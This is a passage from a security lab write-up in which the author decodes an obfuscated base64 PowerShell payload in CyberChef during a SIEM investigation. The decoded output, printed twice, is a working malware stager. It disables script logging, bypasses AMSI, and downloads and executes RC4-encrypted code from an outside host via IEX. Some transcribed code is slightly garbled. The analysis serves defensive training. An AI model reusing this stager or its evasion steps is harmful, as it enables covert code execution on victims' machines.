*   Searched for <mark>Defang URL</mark> and dragged it into the <mark>"Recipe"</mark> field
*   Here, the output showed final URL


![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2022.png)
Figure 22


**Input**
```
SQBGACgAJABQAFMAVgB1AHIAUwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwB1ACAAMwApAHsAJAAxADEAQgBEADgAPQBbAHIAZQBGAF0ALgBBAFMAcwBlAE0AYgBsAHkALgBHAGUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABVAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAbABkACIAKAAnAGMAYQBjAGgAZQBHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAAxADEAQgBkADgAKQB7ACQAQQAxADgARQAxAD0AJAAxADEAQgBEADgALgBHAGUAdABWAGEATABVAEUAKAAkAG4AVQBsAEwAKQA7AEkAZgAoACQAQQAxADgAZQAxAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQQAxADgAZQAxAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxADEAQgBkADgALgBHAGUAdABWAGEATABVAEUAKAAkAG4AVQBsAEwAKQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBFAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8ATABsAHUAYwB0AGkATwBOAFMALgBHAGUATgBFAHIAaQBDAC4ARABJAGMAVABpAE8ATgBBAFIAWQBbAFMAdAByAEkATgBHACwAUwB5AFMAVABFAG0ALgBPAEIASgBFAEMAVABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBBAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAAxADEAQgBkADgALgBHAGUAdABWAGEATABVAEUAKAAkAG4AVQBsAEwAKQBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWQUx9AEVMcwBFAHsAWwBTAFMAUgBpAFAAVABCAGwAbwBDAEsAXQAuACIAYwBlAFQARgBJAEUATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAIABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbABVAGUAKAAkAE4AdQBMAEwALAAoAE4ARQB3AC0ATwBCAGoAZQBDAHQAIABDAG8ATABMAEUAQwBUAGkATwBOAFMALgBHAGUATgBlAHIAaQBDAC4ASABBAFMAaABTAGUAdABbAFMAVAByAGkAbgBnAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAEUATQBCAEwAeQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBJAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBlACgAJABOAFUATABsACwAIAAkAHQAUgBVAGUAKQA7AH0AOwBbAFMAWQBTAHQARQBtAC4ATgBlAFQALgBTAGUAcgBWAEkAYwBlAFAATwBJAE4AdABNAEEAbgBBAGcAaABFAFIARgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAG8AbgB0AEkATgB1AGUAPQAwADsAJAA3AGEANgBlAEQAPQBOAGUAVwAtAE8AQgBKAGUAQwBUACAAUwB5AHMAdABlAE0ALgBOAGUAdAAuAFcAZQBiAEMAbABJAGUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAFgAVAAuAEUATgBjAG8AZABpAE4ARwBdADoAOgBVAG4AaQBjAG8AZABFAC4ARwBlAHQAUwB0AHIAaQBOAEcAKABbAEMAbwBOAFYAZQBSAFQAXQA6ADoARgByAG8ATQBCAEEAUwBlADYANABTAHQAUgBJAG4ARwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1ACcAIAApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANwBhADYARQBkAC4AUABSAE8AeABZAD0AWwBTAHkAUwBUAEUAbQAuAE4ARQBUAC4AVwBlAGIAUgBFAFEAVQBlAFMAVABdADoAOgBEAGUAZgBBAFUAbAB0AFcAZQBCAFAAcgBvAFgAWQA7ACQANwBhADYARQBEAC4AUABSAE8AWABZAC4AQwBSAGUAZABFAG4AdABJAEEAbABTACAAPQAgAFsAUwBZAHMAVABFAE0ALgBOAEUAdAAuAEMAUgBlAGQARQBuAFQASQBhAEwAQwBhAGMAaABFAAFdADoAOgBEAEUARgBhAFUAbAB0AE4ARQBUAFcAbwBSAEsAQwByAEUAZABlAE4AdABJAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAFgAeQAgAD0AIAAkADcAYQA2AGUAZAAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABlAE0ALgBUAGUAWABUAC4ARQBuAEMAbwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAUwAoACcAcQBtAC4AQAApADUAeQA/AFgAeAB1AFMAQQAtAD0AVgBEADQANgA3ACoATABXAEIAfgByAG4AOABeAEkAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1ACUANwAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAAUAEYAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANwBBADYAZQBkAC4ASABlAEEARABlAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIAAiAEsAdQBVAHoAdQBpAGQAPQBWAG0AZQBLAFYANQBkAGUAawBnADkAeQA3AGsALwB0AGwARgBGAEEAOABiADIAQQBhAEkAcwA9ACIAKQA7ACQARABhAHQAYQA9ACQANwBhADYAZQBkAC4ARABvAHcATgBMAG8AYQBkAEQAYQB0AEEAKAAkAFMARQByACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAQQBbADAALgAuADMAXQA7ACQARABhAFQAQQA9ACQAZABBAFQAQQBbADQALgAuACQARABhAFQAQQAuAEwARQBuAEcAdABIAAFdADsALQBKAE8AaQBOAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```
RBC: 5072 | 1 | Tr Raw Bytes | LF

**Output**
```powershell
criptB'+'lockLogging']=$VAl}
ELsE{[ScRipTBloCK]."GeTFIELd"('signatures', 'N'+'onPublic, Static').SEtVAlUe($NuLL,(NEw-OBjeCt CoLLEcTiONS.GeNerIc.HAsHSet[STring]))}$ReF=[Ref].AsSEMBly.GeTTyPe('System.Management.Automation.Amsi'+'Utils');
$Ref.GEtFIeLd('amsiInitF'+'ailed', 'NonPublic,Static').SEtVALue($NULl, $tRUe);};[SYStEm.NeT.ServICePoINtMAnAgER]::EXpeCT100ContINue=0;$7a6eD=NeW-OBJeCT SYsteM.Net.WEbClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([TeXT.ENCodiNG]::UnicodE.GetStriNG([CoNVeRT]::FroMBASe64StRInG('<mark>aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==</mark>')));$t='/news.php';
$7a6Ed.PROxY=[SySTEm.NET.WebREQUesT]::DefAULtWeBPRoXY;
$7a6ED.PROXY.CRedEntIA1S = [SYsTEM.NEt.CRedEnTIaLCachE]::DEFaU1tNETwoRKCrEdeNtIALS;$Script:ProXy = $7a6ed.Proxy;$K=[SysteM.TeXT.EnCoDIng]::ASCII.GeTByTeS('qm.@)5y?XxuSA-=VD467*|0LWB~rn8^I');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CoUnt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I], $S[$H]=$S[$H], $S[$I];$_-Bx0R$S[($S[$I]+$S[$H])%256]}};$7A6ed.HeADers.Add("Cookie", "KuUzuid=VmeKV5dekg9y7k/tlFFA8b2AaIs=");$Data=$7a6ed.DowNLoadDatA($SEr+$t);$iv=$DATA[0..3];$DaTA=$dATA[4..$DaTA.LEnGtH]; -JOiN[Char[]](& $R $dAta ($IV+$K))|IEX
```
RBC: 1901 | 1 | 845 | 9ms | Tr Raw Bytes | VT (detected)

STEP | **BAKE!** | [x] Auto Bake

### Conclusion


# CyberChef

**URL**: `gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Remove_null_bytes()`

**Last build**: A day ago | Options | About / Support

## Operations
* **remove null**
* **Remove null bytes**
* **Favourites** ★
* **Data format**
* **Encryption / Encoding**
* **Public Key**
* **Arithmetic / Logic**
* **Networking**
* **Language**
* **Utils**
* **Date / Time**
* **Extractors**
* **Compression**
* **Hashing**
* **Code tidy**
* **Forensics**
* **Multimedia**
* **Other**
* **Flow control**

## Recipe
**From Base64**
* **Alphabet**: `A-Za-z0-9+/=`
* [x] **Remove non-alphabet chars**
* [ ] **Strict mode**

**Remove null bytes**

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2023.png)
Figure 23


## Input
```text
SQBGACgAJABQAFMAVgB1AHIAUwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBJAE8A
TgAuAE0AYQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJAAxADEAQgBEADgAPQBbAHIAZQBGAF0A
LgBBAFMACWB1AE0AYgBsAHkALgBHAGUAdABUAHkAUABFACgAJwBTAHkACWB0AGUAbQAuAE0A
YQBuAGEAZwB1AG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcA
KQAuACIARwBFAFQARgBJAGUAYABsAGQAIgAoACcAYwBhAGMAaAB1AG0ARwByAG8AdQBwAFAA
bwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcACWAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkA
YwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAMQAxAEIAZAA4ACkAewAkAEEAMQA4AEUA
MQA9ACQAMQAxAEIARAA4AC4ARwB1AHQAVgBhAEwAVQBFACgAJABuAFUAbABMACkAOwBJAGYA
KAAkAEEAMQA4AGUAMQA bACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcA
aQBuAGcAJwBdACkAewAkAEEAMQA4AGUAMQA bACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8A
YwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYgBsAGUAUwBjAHIAaHAAdABCACcA
KwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABhADEAOAB1ADEAWwAnAFMA
YwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXwBbACcAROBuAGEA
YgBsAGUAUwBjAHIAaHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBn
AGkAbgBnACcAXwAPQAwAH0AJAB2AEEATAA9AFsAQwBvAEwAbAB1AGMAdABpAE8ATgBTAC4A
RwB1AE4ARwByAGkAQwAuAEQASQBjAFQAaQBPAG4AQQBSAFkAWwBTAHQAcgBJAE4ARwAsAFMA
eQBZAFQARQBtAC4ATwBCAEoARQBjAHQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAQQBMAC4A
QQBkAEQAKAAnAEUAbgBhAGIAbAB1AFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8A
ZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbAB1AFMA
```
`length: 5072` | `lines: 1` | `Raw Bytes` | `LF`

## Output
```powershell
1\ScriptB'+'lockLogging']=$VAl}
ELsE{[ScRipTBloCK]."GeTFIE'Ld"('signatures', 'N'+'onPublic, Static').SEtVA
lUe($NuLL, (NEw-OBjeCt
CoLLEcTiONS.GeNerIc.HAsHSet[STring]))}$ReF=[Ref].AsSEMBly.GeTTyPe('Syste
m.Management.Automation.Amsi'+'Utils');
$Ref.GEtFIeLd('amsiInitF'+'ailed', 'NonPublic,Static').SEtVALue($NULl,
$tRUe);}; [SYStEm.NeT.ServICePoINtMAnAgER]::EXpeCT100ContINue=0;
$7a6eD=NeW-OBJeCT SYsteM.Net.WEbClIeNT;$u='Mozilla/5.0 (Windows NT 6.1;
wOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([TeXT.ENCodiNG]::UniCodE.GetStriNG([CoNVeRT]::FroMBASe64StRInG('<mark>a
AB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==</mark>')));$t='/news.php';
$7A6Ed.HEAders.Add('User-Agent', $u);
$7a6Ed.PROxY=[SySTEm.NET.WebREQUesT]::DefAULtWeBPRoXY;
$7a6ED.PROXY.CRedEntIAlS =
[SYsTEM.NEt.CRedEnTIaLCachE]::DEFaU1tNETwoRKCrEdeNtIALS;$Script:Proxy =
$7a6ed.Proxy;$K=[SysteM.TeXT.EnCoDIng]::ASCII.GeTByTeS('qm.@)5y?XxuSA-
=VD467*|0LWB~rn8^I');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+
$K[$_%$K.CoUnt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;
$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-Bx0R$S[($S[$I]+
```
`length: 1901` | `lines: 1` | `1169-1217 (48 selected)` | `9ms` | `Raw Bytes` | `VT (detected)`

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2024_Badge.png)
Figure 24


# Conclusion

This lab project helped equip me and the community with the knowledge and skills to use Splunk's Search Processing Language to conduct investigations. In my next SIEM project, I intend to use Splunk for Incident Handling. Stay tuned and please give a "Star" to my repositories if you like my work.

